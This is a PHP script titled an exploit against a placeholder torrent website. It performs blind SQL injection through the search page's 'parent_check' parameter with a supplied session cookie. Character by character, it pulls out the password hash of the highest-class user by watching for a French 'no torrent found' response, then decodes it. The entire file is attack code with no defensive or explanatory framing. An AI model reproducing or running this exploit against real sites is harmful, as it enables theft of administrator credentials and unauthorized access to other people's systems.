<?php

function dump_password($i, $f){
    $ch_ = curl_init();
    curl_setopt($ch_, CURLOPT_URL, "http://www.[TARGET_NAME].com/torrents-search.php?parent_check=where+left%28%28select%20password%20from%20users%20order%20by%20class%20desc%20limit%201%29,%20".$f."%20%29=%20".$i."");
    curl_setopt($ch_, CURLOPT_GET, 1);
    curl_setopt($ch_, CURLOPT_COOKIE, "[COOKIE_DATA_PLACEHOLDER]");
    curl_setopt($ch_, CURLOPT_RETURNTRANSFER, 1);
    $page = curl_exec($ch_);
    curl_close($ch_);
    return $page;
}

print "Exploit for [TARGET_NAME]\n";

$keyCharacters = '[KEY_CHARACTERS_PLACEHOLDER]';
$finalResult = '';
$decodedStr = '';
$counter = 1;

while($counter != 33)
{
    for($charIndex = 0; $charIndex < strlen($keyCharacters); $charIndex++)
    {
        $hexRepresentation = bin2hex($keyCharacters[$charIndex]);
        if (!empty($finalResult))
        {
            $responsePage = dump_password("0x".$finalResult.$hexRepresentation, $counter);
        }
        else
        {
            $responsePage = dump_password("0x".$hexRepresentation, $counter);
        }
        
        if (!preg_match("/'Aucun torrent trouvé, basé sur vos critères de recherche.'/i", $responsePage))
        {
            $finalResult .= $hexRepresentation;
            echo $hexRepresentation;
            $counter++;
        }
    }
}
for ($charPos = 0; $charPos < strlen($finalResult); $charPos += 2) 
{
    $decodedStr .= chr(hexdec(substr($finalResult, $charPos, 2)));
}
echo "\nResult: " . $decodedStr . "\n";
